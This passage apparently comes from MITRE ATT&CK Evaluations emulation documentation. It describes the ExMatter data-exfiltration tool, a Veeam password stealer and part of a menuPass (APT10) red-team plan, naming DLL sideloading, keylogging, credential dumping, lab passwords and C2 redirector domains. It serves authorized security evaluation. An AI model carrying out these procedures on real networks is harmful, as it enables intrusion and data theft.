References","p":["https://www.varonis.com/blog/blackcat-ransomware","https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/","https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf","https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Linux/BlackCat.A!MTB","https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-alphv-rust-ransomware","https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/","https://securityintelligence.com/posts/blackcat-ransomware-levels-up-stealth-speed-exfiltration/"]}],[{"l":"ExMatter"},{"l":"Overview","p":["After BlackCat deploys InfoStealer and successfully recovers credentials from the SQL server, the credentials are then used to remotely deploy ExMatter via a PowerShell script. Once ExMatter is deployed, it will build out a queue of files for exfiltration using a combination of inclusion/exclusion lists and file time metadata. After the list is created, ExMatter will package the files into zips and exfiltrate them to a remote SFTP server. When exfiltration is finished, ExMatter will destroy itself by spawning a PowerShell script to overwrite some bytes of its executable, and then delete the executable."]},{"l":"Troubleshooting"},{"l":"Logging","p":["The ExMatter log file will be created in the same folder where the ExMatter executable is. The name of the log file will be EMlog.txt and will be encrypted using AES-256-CBC with the key 0370dd5addcd980e8f4b424c92d8049e99c7c7c5d09eedfcc58f6abca9e72f99. To decrypt an encrypted log file, use the alphv_blackcat/Resources/log_decryptor/aes_base64_log_decryptor.py Python utility and pass in the correct cipher and AES key:","Alternatively, you can use the aes-tool.exe(built with the cmake pipeline) with the following command:","aes-tool.exe -d PATH TO LOG FILE","If you run into permission issues for SFTP, ensure that the SFTP server is set up with the expected user credentials, and that the SFTP user has write access to its SFTP home directory."]},{"l":"Functionality"},{"l":"Scan logical drives","p":["Discover logical drives using DriveInfo.GetDrives().","Log drive information.","Populate list of drives to investigate."]},{"l":"File discovery","p":[".bmp",".doc",".docx",".dwg",".ipt",".jpeg",".jpg",".msg",".pdf",".png",".pst",".rdp",".rtf",".sql",".txt",".xls",".xlsx",".zip","AppData\\Local\\Microsoft\\","AppData\\Local\\Packages\\","AppData\\Roaming\\Microsoft\\","C:\\$Recycle.Bin\\","C:\\Documents and Settings\\","C:\\PerfLogs\\","C:\\Program Files (x86)\\","C:\\Program Files\\","C:\\ProgramData\\","C:\\Users\\All Users\\Microsoft\\","C:\\Windows\\","Ignore directories that are symlinks or junctions.","Ignore files that have the System or Temporary file attribute.","Ignore these directories:","Maximum file size: 64MB","Minimum file size: 4KB","Only include files with these extension:","Recursively parse drives for files of interest, build a list of files found:"]},{"l":"Stage files","p":["Sort the files from most to least recent last write time.","Compress the files into zips, 100 files per zip, processing the most recently written to files first."]},{"l":"Exfiltration","p":["Upload the zips to the SFTP server in the order that they were created. Each time ExMatter is run, it will create a unique upload directory on the remote SFTP server to store the exfiltrated archives. The upload directory name format is local hostname + timestamp (e.g. victimmachine20231129131516).","SSH.NET is used to perform SFTP actions."]},{"l":"Self-destruction","p":["Spawn a PowerShell process that:","Stops ExMatter process.","Overwrites first 65535 bytes of ExMatter executable.","Deletes ExMatter executable."]},{"l":"Obfuscation","p":["ExMatter uses ConfuserEx for obfuscation<a id=\"fnref:12\" href=\"#fn:5\" class=\"footnote-ref\"><sup>5</sup></a>. The obfuscated binary will be output to bin/Release/ExMatter.exe, and the settings used to obfuscate are here. You can use the standalone version of ConfuserEx to obfuscate ExMatter with this .crproj file with slight modifications."]},{"l":"Build","p":["Built exe files are in /bin/:","Debug/ExMatter.exe: ExMatter built in debug mode","Release/ExMatter.exe: ExMatter built in release mode","aes-tool.exe: Encrypted log decryptor","ExMatter uses CMake to build. CMake will pull down ConfuserEx and ILRepack from github to use post-build. ExMatter's post-build actions are as follows:","Build ILMerge","Run ILMerge on ExMatter to merge the SSH.NET dll into ExMatter","Run Confuser on ExMatter and move the finished binary to the folder in /bin/ depending on build configuration"]},{"l":"Testing","p":["ExMatter was tested with the included test.ps1 script, which creates \"good\" files for ExMatter to find and \"bad\" files that ExMatter shouldn't find. The SFTP server IP and credentials are hard coded, so those should be changed to reflect your environment when testing. test.ps1 is intended to be run in a high integrity context, though this is not requied."]},{"l":"Debug","p":["ExMatter has a built-in debug mode when built with the ExMatter-debug configuration defined in CMakePresets.json. This mode uses compiler directives to disable encrypted logging, only target files output from test.ps1, remove files from the SFTP server after upload, and disable the powershell destructor."]},{"l":"aes-tool and Logging","p":["ExMatter includes a small executable to decrypt its encrypted logs. ExMatter creates its log file where its exe is located. Use the following command to decrypt the logs:","aes-tool.exe -d PATH TO LOG FILE","You can also run the aes-tool interactively."]},{"l":"SFTP Setup"},{"l":"Alternative PowerShell Script","p":["A PowerShell version of ExMatter was created in case ExMatter fails to run. Major deviations between the two versions are as follows:","Use the PowerShell command Compress-Archive to create the zip files instead of the C# library","Use the PowerShell command ftp -s to upload zips to the ftp site instead of the SSH.NET library","Use a ftp server instead of an sftp server so we can make use of the -s flag and for easier authentication","No debug mode since we cannot use compiler directives"]},{"l":"FTP Setup"},{"l":"CTI References","p":["https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackmatter-data-exfiltration<a href=\"#fnref:1\" class=\"footnote-back-ref\">&#8617;</a><a href=\"#fnref:2\" class=\"footnote-back-ref\">&#8617;</a>","https://www.netskope.com/blog/blackcat-ransomware-tactics-and-techniques-from-a-targeted-attack<a href=\"#fnref:3\" class=\"footnote-back-ref\">&#8617;</a><a href=\"#fnref:4\" class=\"footnote-back-ref\">&#8617;</a>","https://stairwell.com/news/threat-research-report-exmatter-future-of-data-extortion/<a href=\"#fnref:5\" class=\"footnote-back-ref\">&#8617;</a><a href=\"#fnref:6\" class=\"footnote-back-ref\">&#8617;</a><a href=\"#fnref:7\" class=\"footnote-back-ref\">&#8617;</a>","https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps<a href=\"#fnref:8\" class=\"footnote-back-ref\">&#8617;</a><a href=\"#fnref:9\" class=\"footnote-back-ref\">&#8617;</a>","https://www.bleepingcomputer.com/news/security/blackcat-ransomware-s-data-exfiltration-tool-gets-an-upgrade/<a href=\"#fnref:10\" class=\"footnote-back-ref\">&#8617;</a><a href=\"#fnref:11\" class=\"footnote-back-ref\">&#8617;</a><a href=\"#fnref:12\" class=\"footnote-back-ref\">&#8617;</a>","https://securityintelligence.com/posts/blackcat-ransomware-levels-up-stealth-speed-exfiltration/<a href=\"#fnref:13\" class=\"footnote-back-ref\">&#8617;</a>"]}],[{"l":"Infostealer"},{"l":"InfoStealer","p":["This C# utility emulates BlackCat's custom utility to query Veeam backup SQL Server to extract passwords."]},{"l":"Building","p":["Leverage CMake to build the executable in the project's root directory.","Note, CMakeLists is wrapping dotnet commands to build the CSharp application","This command will generate a debug and release build. You will want the release build, this is located at infostealer\\sqlsharp\\bin\\x64\\Release\\net6.0-windows\\win-x86\\publish","Build with dotnet"]},{"l":"Execution","p":["A DPAPI blob can be generated using the gen_dpapi_blob.ps1 script. The script takes 1 argument-String and encrypted the provided string with DPAPI. Example:","Query local MS SQL server ( localhost) with specific username ( testlogin), and password ( Password)","Decrypt a provide dpapi base64 encoded blob:","Execute Help menu"]},{"l":"Executing under another user context","p":["If the passwords are DPAPI encrypted using another users password, you can run the applcation using that users context as long as you have the users password: Open a command prompt, then enter the following:"]},{"l":"CTI","p":["Noberus Ransomware: Darkside and BlackMatter Successor Continues to Evolve its Tactics","Decrypting VEEAM Passwords"]}],[{"l":"Log Decryptor","p":["The Python script aes_base64_log_decryptor.py will decrypt standard AES-base64 encrypted+encoded log files generated by implants and other red team tools. The expect log file format is as follows:","Each line is a base64-encoded IV+ciphertext blob, where the blob is the ciphertext appended to the initialization vector.","The underlying ciphertext was encrypted using 128- or 256-bit AES in either CTR (big endian) or CBC mode.","In other words, each line is of the format: base64(IV + AES(IV, plaintext))"]},{"l":"Usage","p":["Note that you must select only one of the following for decryption modes:","--aes-256-cbc for 256-bit AES CBC","--aes-128-cbc for 128-bit AES CBC","--aes-256-ctr for 256-bit AES CTR","--aes-128-ctr for 128-bit AES CTR","Examples:"]},{"l":"Requirements","p":["Python v3.9+, pycryptodome:"]},{"l":"Testing","p":["A unit test Python script test_aes_base64_log_decryptor.py is provided - be sure to update this script with additional unit tests if extending the log decryptor script to support more decryption modes.","To run the unit test script:","Example output:"]}],[{"l":"menuPass","p":["License","Based on open-source intelligence, the MITRE ATT&CKÂ® Evaluations team created the menuPass scenario leveraging techniques seen in the wild. The scenario was built based on tools, intelligence, and resources available at the time."]},{"i":"adversary-overview","l":"Adversary Overview \uD83D\uDC3C","p":["Active since at least 2006, menuPass(aka APT10) is a threat group believed to be sponsored by the Chinese Ministry of State Security (MSS). The group has focused on the exfiltration of sensitive data in support of Chinese national security objectives. menuPass has targeted the aerospace, construction, engineering, government, and telecommunications sectors primarily in the US, Europe, Japan, and other parts of Southeast Asia. The group is known for orchestrating Operation Cloud Hopper, a global espionage campaign discovered in 2016 and 2017 that involved the sustained exploitation of MSPs. In December 2018, the US DOJ filed criminal charges against two menuPass members in connection to the groupâs activities.","MSS-affiliated groups such as menuPass have demonstrated a pattern of exploiting targets on a much broader geographic scope than the groups sponsored by the People Liberation Army (PLA), and are believed to be more likely to target the United States and regions outside of Chinaâs direct sphere of influence. menuPass is known specifically for its use of living-off-the-land techniques, leveraging custom malware, utilizing fileless and anti-analysis tactics for defense evasion, and exploiting trusted third-party relationships for credential access."]},{"l":"Quick Links"},{"l":"Resources","p":["The Resources Folder contains the emulated software source code.","All other pre-built executables have been removed. To rebuild the binaries, follow the documentation for the respective binary."]},{"i":"emulation-key-software","l":"Emulation Key Software \uD83D\uDCBB","p":["SigLoader","FYAnti","SodaMaster","Quasar","Impacket","WMIexec.vbs"]},{"l":"Scenario Walkthrough","p":["menuPass Scenario Overview- Overview of the menuPass scenario","menuPass Emulation Plan- Step by step walkthrough of the menuPass red team emulation plan (9 steps)"]},{"l":"Acknowledgements","p":["We would like to formally thank the people that contributed to the content, review, and format of this document. This includes the MITRE ATT&CK and MITRE ATT&CK Evaluations teams, the organizations and people that provided public intelligence and resources, as well as the following organizations that participated in the community cyber threat intelligence contribution process:","Microsft","CrowdStrike"]},{"i":"connect-with-us","l":"Connect with us \uD83D\uDDE8ï¸","p":["We \uD83D\uDC96 feedback! Let us know how using ATT&CK Evaluation results has helped you and what we can do better.","Email: evals@mitre-engenuity.org Twitter: https://twitter.com/MITREengenuity LinkedIn: https://www.linkedin.com/company/mitre-engenuity/"]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Â© 2024 MITRE Engenuity. Approved for Public Release. Document number CT0005.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CKÂ®","ATT&CK Terms of Use"]}],[{"i":"menupass","l":"menuPass \uD83D\uDC3C"},{"l":"Adversary Overview","p":["Active since at least 2006, menuPass(aka APT10) is a threat group believed to be sponsored by the Chinese Ministry of State Security (MSS). The group has focused on the exfiltration of sensitive data in support of Chinese national security objectives. menuPass has targeted the aerospace, construction, engineering, government, and telecommunications sectors primarily in the US, Europe, Japan, and other parts of Southeast Asia. The group is known for orchestrating Operation Cloud Hopper, a global espionage campaign discovered in 2016 and 2017 that involved the sustained exploitation of MSPs. In December 2018, the US DOJ filed criminal charges against two menuPass members in connection to the groupâs activities."]},{"l":"Key Adversary Report References","p":["1","10","11","12","2","3","4","5","6","7","8","9","A41APT case","APT Threat Landscape in Japan 2020","APT10: sophisticated multi-layered loader Ecipekac discovered in A41APT campaign","APT10: Tracking down the stealth activity of the A41APT campaign","Earth Tengsheãã«ãããã«ã¦ã§ã¢ãSigLoaderããç¨ããæ»æã­ã£ã³ãã¼ã³ã®è§£èª¬","Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign","Report Links","Source ID","Threat Spotlight: MenuPass/QuasarRAT Backdoor","Uncovering New Activity By APT10","What We Can Do against the Chaotic A41APT Campaign","æ·±åº¦åæéå°èºç£éèæ¥­ç Operation Cache Panda çµç¹åä¾æéæ»æ","ç·æ¥ã¬ãã¼ããMicrosoftç¤¾ã®ãã¸ã¿ã«ç½²åãã¡ã¤ã«ãæªç¨ãããSigLoaderãã«ããæ¨çåæ»æãç¢ºèª"]}],[{"l":"Scenario Diagrams","p":["This scenario involved menuPass orchestrating an attack against two subsidiaries of a fictitious global pharmaceutical company. Below is an overview of the attack sequence and major activities executed by the threat actor. A Operations Flow, Infrastructure Diagram and Technique Scope. For more detailed information about the exact activities of the red team, please refer to the menuPass Emulation Plan)."]},{"l":"Operations Flow"},{"l":"Infrastructure Diagram"},{"l":"Technique Scope"}],[{"l":"Scenario Overview","p":["This scenario involved menuPass orchestrating an attack against two subsidiaries of a fictitious global pharmaceutical company. Below is an overview of the attack sequence and major activities executed by the threat actor. For more detailed information about the exact activities of the red team, please refer to the menuPass Emulation Plan."]},{"l":"Overview","p":["menuPass begins by using previously stolen credentials from local admin user Kizumi to remotely access the Microsoft IIS web server on Subsidiary Aâs network ( Step 1 of IIS Server Diagram). The threat actor will then drop the multi-stage loader malware SigLoader, which loads the first payload, FYAnti( Step 2-3 of IIS Server Diagram). FYAnti will then execute the open-source RAT, QuasarRAT, on the server ( Step 4 of IIS Server Diagram). QuasarRAT checks for internet connectivity then connects to the C2 server and begins logging keystrokes ( Step 5 of IIS Server Diagram).","Once C2 communications have been established, the threat actor will leverage QuasarRAT to perform discovery on the IIS server. As a result, the adversary discovers a domain controller on Subsidiary A's network.","Next, menuPass observes user Kizumi logging into the IIS server. While she is working, Kizumi is prompted to enter her domain admin credentials, which will be captured by the adversary via QuasarRATâs keylogger ( Step 5 of IIS Server Diagram).","To prepare to move laterally onto the domain controller, the threat actor downloads a second copy of SigLoader, FYAnti, and QuasarRAT on the IIS server ( Step 1 of Domain Controller Diagram). By using PowerShell with Kizumiâs credentials, the threat actor moves the malware to the domain controller then creates and runs a scheduled task ( Step 2 of Domain Controller Diagram). This scheduled task is utilized to DLL sideload SigLoader and execute QuasarRAT on the domain controller. ( Step 2-3 of Domain Controller Diagram).","Once QuasarRAT establishes C2 communications on the domain controller, menuPass dumps credentials via NTDS and exfiltrates the output ( Step 4 of Domain Controller Diagram). The threat actor analyzes the dump offline to retrieve plaintext passwords for domain users. menuPass then conducts an internal port scan to search for open RDP and SMB ports on the network. As a result, the threat actor discovers the bastion workstation, which is located in Subsidiary Bâs network with access to Subsidiary Aâs network ( Step 5 of Domain Controller Diagram).","Next, menuPass uses QuasarRAT on the domain controller, which is running with domain administrator privileges, to download SigLoader and SodaMaster to the bastion workstation ( Step 1 of Bastion Host Diagram). The threat actor then remotely creates a service on the bastion workstation that will execute a legitimate binary to sideload SigLoader( Step 2 of Bastion Host Diagram).","The threat actor then executes the remotely created service which DLL sideloads SigLoader, which loads the SodaMaster payload ( Step 3 of Bastion Host Diagram). On execution, SodaMaster performs automated discovery, anti-sandbox checks, and modifies the hostâs Windows Defender whitelist ( Steps 4-5 of Bastion Host Diagram). As a result, menuPass notices the presence of a file server on Subsidiary Bâs network.","The threat actor then observes user Kmimi accessing the bastion host to perform tasks. Kmimi is a file server administrator on Subsidiary Bâs network. To prepare to move laterally onto this server, the threat actor uses secretsdump to dump credentials from Security Account Manager (SAM), Local Security Authority (LSA), and cached domain credentials, which is cracked offline to retrieve Kmimiâs admin credentials ( Step 1 of File Server Diagram).","In order to pivot onto the file server, menuPass downloads WMIexec.vbs onto the bastion workstation ( Step 2 of File Server Diagram). menuPass then downloads WMIexec.vbs onto the workstation, and accesses the bastion workstation via RDP using Kmimiâs previously retrieved credentials to execute WMIexec.vbs, establishing a reverse shell to the file server ( Step 3 of File Server Diagram). Using the reverse shell, menuPass executes PowerShell to enumerate files( Step 4 of File Server Diagram). After the desired data has been found, the threat actor compresses the desired data via WinRAR and exfiltrates it via RoboCopy to an adversary controlled network share ( Steps 5-6 of File Server Diagram)."]}],[{"l":"menuPass Emulation Plans","p":["This directory contains the emulation plans for menuPass.","â¹ï¸ An emulation plan is the primary document used to execute the red team scenario during a purple team operation.","The scenario documents in the table below include the red team execution commands, links to source code, ATT&CK techniques leveraged, and CTI reporting pertaining to each scenario step.","Red Team Playbook","CTI Overview","Description","MSR2_menuPass_Scenario.md","menuPass CTI Overview","This contains the scenario developed to emulate TTPs of menuPass in Round 2 of ATT&CK Evaluations for Managed Services"]}],[{"l":"menuPass Scenario Overview"},{"i":"step-0---operator-setup","l":"Step 0 - Operator Setup"},{"i":"procedures","l":"â£ï¸ Procedures","p":["Initiate an RDP session to the Windows jumpbox homelander (116.83.1.29)","Search for Command Prompt and right-click Run As Administrator. Execute the following command to start the Quasar C2 server:","â¡ï¸ Initiate an RDP session to the Kali attack host kraken (176.59.1.18)","In a new terminal window, start the evalsC2server, ensuring the following handlers are enabled:","QuasarRAT","SodaMaster","Simple file server","Right-click within the terminal window and click \"Split Terminal Horizontally\". Within the new terminal, change directory to the location of the evalsC2client.py and use this terminal for tasking implants."]},{"i":"step-1---establish-persistence","l":"Step 1 - Establish Persistence"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["menuPass gains initial access via stolen credentials with local administrative privileges. These credentials allow the adversary to access the Microsoft Internet Information Services (IIS) web server gabumon (10.10.10.9) in Subsidiary Aâs environment via RDP.","After establishing access on the IIS server gabumon (10.10.10.9), menuPass downloads Sigloader, its components, and the encrypted QuasarRAT module on the victim device using certutil. SigLoader is a multi-layer loader that loads and decrypts the target payload. Eventually, SigLoader will load the first payload, FYAnti, in memory.","FYAnti decrypts the first embedded .NET module and executes the module using the CppHostCLR technique to avoid dropping additional files to disk. When executed, the first embedded .NET module then enumerates files to find the QuasarRAT .NET module on disk, decrypts it, and then executes it.","QuasarRAT, which has been modified and heavily obfuscated, checks first for internet connectivity then connects to the C2 server using a redirector at notepad-plusplus-updates[.]com (121.93.4.32)."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Confirm C2 registration of QuasarRAT","DIGIRUNAWAY\\kizumi","Execute certutil to download SigLoader and FYAnti components.","Execute NotePad++.exe to perform DLL sideloading. SigLoader will load FYAnti and FYAnti will load QuasarRAT.","From the Windows jumpbox homelander (116.83.1.29), using the provided stolen system credentials, RDP to the IIS Server gabumon (10.10.10.9).","Minimize Notepad++ and close out of all other windows, then disconnect from the RDP session (do not sign out)","mshtml.wpf.wfx is a symbolic link to menu_pass/Resources/payloads/sigloader/IIS_fyanti.dll","ngen.old2.log is a symbolic link to menu_pass/Resources/payloads/sigloader/Client.exe.enc","Note:","NOTE: the current working directory should be C:\\Windows\\System32. This is where the Quasar clientmanagement.log will be dropped.","Open Command Prompt with administrative privileges","Password","skt.dll is a symbolic link to menu_pass/Resources/payloads/sigloader/IIS_layer2.dll","Username","VERSION.dll is a symbolic link to menu_pass/Resources/payloads/sigloader/IIS_layer1.dll","ydJEeqNzN4Xqkd9h@"]},{"i":"reference-code-reporting","l":"\uD83D\uDD0D Reference Code & Reporting","p":["-","ATT&CK Technique","Authenticate with IIS admin credentials","BlackBerry","BlackBerry Kaspersky","ConfuserEx Settings","Connect","decrypt","Dropped files were modified to contain shellcode","Dropped files' signatures are still valid","embedded.hpp","Execute certutil to download Sigloader, FYAnti, and QuasarRAT components","Execute Notepad++.exe to perform DLL sideloading","execute_ssembly","FindModule, Invoke","FYAnti contains an embedded .NET assembly","FYAnti reflectively loads and executes the QuasarRAT loader via CppHostClr","http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf","https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf","https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf","https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/","https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage","https://www.lac.co.jp/lacwatch/report/20201201_002363.html","https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html","â¹ï¸ NOTE: Not all techniques listed in this table directly map to evaluation substeps","Kaspersky","Kaspersky Symantec DOJ","Keylogger","Open cmd","Quasar Github","QuasarRAT C2 communications are encrypted with symmetric encryption","QuasarRAT C2 communications use TLS","QuasarRAT communicates over TCP","QuasarRAT loader decrypts QuasarRAT","QuasarRAT loader is obfuscated using ConfuserEx","QuasarRAT loader loads and executes QuasarRAT","QuasarRAT starts keylogging","RDP to the IIS server","Red Team Activity","Relevant CTI Report","run_code","SigFlip documentation","SigLoader decrypts shellcode (combination of XOR/AES/DES)","SigLoader reflectively loads and executes FYAnti","Source Code Link","SslStream","Symantec","T1021.001 Remote Services: Remote Desktop Protocol","T1027.002 Obfuscated Files or Information: Software Packing","T1027.009 Obfuscated Files or Information: Embedded Payloads","T1056.001 Input Capture: Keylogging","T1059.003 Command and Scripting Interpreter: Windows Command Shell","T1078.002 Valid Accounts: Domain Accounts","T1095 Non-Application Layer Protocol","T1105 Ingress Tool Transfer","T1140 Deobfuscate/Decode Files or Information","T1553.002 Subvert Trust Controls: Code Signing","T1573.001 Encrypted Channel: Symmetric Cryptography","T1573.002 Encrypted Channel: Asymmetric Cryptography","T1574.002 Hijack Execution Flow: DLL Side-Loading","T1620 Reflective Code Loading"]},{"i":"step-2---initial-discovery","l":"Step 2 - Initial Discovery"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["After establishing communications with the C2 server, menuPass will use QuasarRAT to execute scripted discovery actions and discover the presence of a domain controller on Subsidiary Aâs network."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Using QuasarRAT, download the PowerShell discovery script to the IIS Server","Using QuasarRAT, execute the PowerShell discovery script"]},{"i":"reference-code-reporting","l":"\uD83D\uDD0D Reference Code & Reporting","p":["ATT&CK Technique","BlackBerry","ExecuteProcess","https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor","https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf","https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf","https://medium.com/cycraft/supply-chain-attack-targeting-taiwan-financial-sector-bae2f0962934","https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/","https://web.archive.org/web/20191028183408/https://blog.ensilo.com/uncovering-new-activity-by-apt10","https://www.fortinet.com/blog/threat-research/uncovering-new-activity-by-apt-","â¹ï¸ NOTE: Not all techniques listed in this table directly map to evaluation substeps","Kaspersky","PowerShell script executes ipconfig /all","PowerShell script executes nslookup","Quasar Github","QuasarRAT execute commands","QuasarRAT executes PowerShell discovery script","Red Team Activity","Relevant CTI Report","Source Code Link","step2discovery.ps1","T1016 System Network Configuration Discovery","T1059.001 Command and Scripting Interpreter: PowerShell","T1106 Native API"]},{"i":"step-3---credential-access-and-privilege-escalation","l":"Step 3 - Credential Access and Privilege Escalation"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Eventually, the IIS Server admin logs in to the IIS Server gabumon (10.10.10.9). While performing tasks, they eventually need to type in their Domain Admin credentials. Using QuasarRAT's keylogger utility, menuPass captures the domain admin credentials.","menuPass initiates a new RDP to the IIS server gabumon (10.10.10.9) using the compromised credentials from Step 1.","Using the RDP to the IIS Server gabumon (10.10.10.9), menuPass opens PowerShell with administrative privileges and authenticates using the domain admin's credentials."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â© Emulate the following legitimate user activity:","â¡ï¸ initiate an RDP session from the jumpbox homelander (176.59.17.22) to gabumon (10.10.10.9) as the IIS Admin:","Username","Password","DIGIRUNAWAY\\kizumi","ydJEeqNzN4Xqkd9h@","Open Command Prompt with administrative privileges, execute cmd via runas with their Domain Admin username, typing the password when prompted:","Type, DO NOT copy and paste, the following when prompted:","Close the Command Prompts then disconnect from the RDP when finished. You should return to homelander (116.83.1.29)","â© Resume red team activity","Using the first QuasarRAT on the IIS server gabumon (10.10.10.9), retrieve keylogs:","Initiate a new RDP to the IIS server gabumon (10.10.10.9) using the stolen credentials from Step 1.","Within the RDP to the IIS server gabumon (10.10.10.9), open Command Prompt with administrative privileges (if not already open) then execute the following runas command, entering the kizumi.da password when prompted:"]},{"i":"reference-code-reporting","l":"\uD83D\uDD0D Reference Code & Reporting","p":["-","ATT&CK Technique","Authenticate with domain admin credentials","Authenticate with IIS admin credentials","BlackBerry","https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor","https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf","https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf","https://medium.com/cycraft/supply-chain-attack-targeting-taiwan-financial-sector-bae2f0962934","https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/","https://web.archive.org/web/20191028183408/https://blog.ensilo.com/uncovering-new-activity-by-apt10","https://www.fortinet.com/blog/threat-research/uncovering-new-activity-by-apt-","https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html","â¹ï¸ NOTE: Not all techniques listed in this table directly map to evaluation substeps","Kaspersky Symantec DOJ","Keylog domain admin credentials","Keylogger","Open Command Prompt","Quasar Github","RDP to the IIS server","Red Team Activity","Relevant CTI Report","Source Code Link","T1021.001 Remote Services: Remote Desktop Protocol","T1056.001 Input Capture: Keylogging","T1059.003 Command and Scripting Interpreter: Windows Command Shell","T1078.002 Valid Accounts: Domain Accounts"]},{"i":"step-4---lateral-movement-to-subsidiary-a-domain-controller","l":"Step 4 - Lateral Movement to Subsidiary A Domain Controller"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Using the first QuasarRAT implant, menuPass downloads a second copy of SigLoader/QuasarRAT to the IIS Server gabumon (10.10.10.9) then uses the elevated Command Prompt to move the executable to the Subsidiary A Domain Controller parrotmon (10.10.10.4).","Using the elevated Command Prompt, menuPass uses the schtasks utility to remotely create and run a scheduled task on the Subsidiary A Domain Controller parrotmon (10.10.10.4) that executes a legitimate executable: Notepad++.exe.","This legitimate executable executes SigLoader via DLL side-loading and results in a second QuasarRAT implant on the Subsidiary A Domain Controller parrotmon (10.10.10.4). This second QuasarRAT implant will connect to the C2 server using a redirector at notepad-plusplus-updates[.]eu (121.93.99.100)."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Using the QuasarRAT on the IIS Server gabumon (10.10.10.9), download a second copy of SigLoader/QuasarRAT components. Wait until each command has returned before executing the next.","SigLoader layer 1","SigLoader layer 2","FYAnti","QuasarRAT","Return to the elevated Command Prompt on the IIS server gabumon (10.10.10.9) and move the downloaded components to the Subsidiary A Domain Controller via SMB.","Using the elevated Command Prompt on the IIS server gabumon (10.10.10.9), remotely create a scheduled task on the Subsidiary A Domain Controller parrotmon (10.10.10.4) to execute a legitimate executable that sideloads SigLoader.","Using the elevated Command Prompt on the IIS server gabumon (10.10.10.9), remotely run the scheduled task created on the Subsidiary A Domain Controller parrotmon (10.10.10.4).","Confirm C2 registration of a second QuasarRAT implant."]},{"i":"reference-code-reporting","l":"\uD83D\uDD0D Reference Code & Reporting","p":["-","ATT&CK Technique","BlackBerry","BlackBerry Kaspersky","ConfuserEx Settings","Connect","Create scheduled task","decrypt","Download 2nd SigLoader/QuasarRAT (non-keylogging)","Dropped files were modified to contain shellcode","Dropped files' signatures are still valid","embedded.hpp","Execute File Download","Execute Notepad++.exe to perform DLL sideloading","execute_ssembly","FindModule, Invoke","FYAnti contains an embedded .NET assembly","FYAnti reflectively loads and executes the QuasarRAT loader via CppHostClr","http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf","https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf","https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf","â¹ï¸ NOTE: Not all techniques listed in this table directly map to evaluation substeps","Kaspersky","Quasar Github","QuasarRAT C2 communications are encrypted with symmetric encryption","QuasarRAT C2 communications use TLS","QuasarRAT communicates over TCP","QuasarRAT loader decrypts QuasarRAT","QuasarRAT loader is obfuscated using ConfuserEx","QuasarRAT loader loads and executes QuasarRAT","Red Team Activity","Relevant CTI Report","Run scheduled task","run_code","SigFlip documentation","SigLoader decrypts shellcode (combination of XOR/AES/DES)","SigLoader reflectively loads and executes FYAnti","Source Code Link","SslStream","T1027.002 Obfuscated Files or Information: Software Packing","T1027.009 Obfuscated Files or Information: Embedded Payloads","T1059.003 Command and Scripting Interpreter: Windows Command Shell","T1095 Non-Application Layer Protocol","T1105 Ingress Tool Transfer","T1140 Deobfuscate/Decode Files or Information","T1553.002 Subvert Trust Controls: Code Signing","T1573.001 Encrypted Channel: Symmetric Cryptography","T1573.002 Encrypted Channel: Asymmetric Cryptography","T1574.002 Hijack Execution Flow: DLL Side-Loading","T1603 Scheduled Task/Job","T1620 Reflective Code Loading","Use elevated Command Prompt"]},{"i":"step-5---credential-access-and-discovery","l":"Step 5 - Credential Access and Discovery"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["After gaining access on the 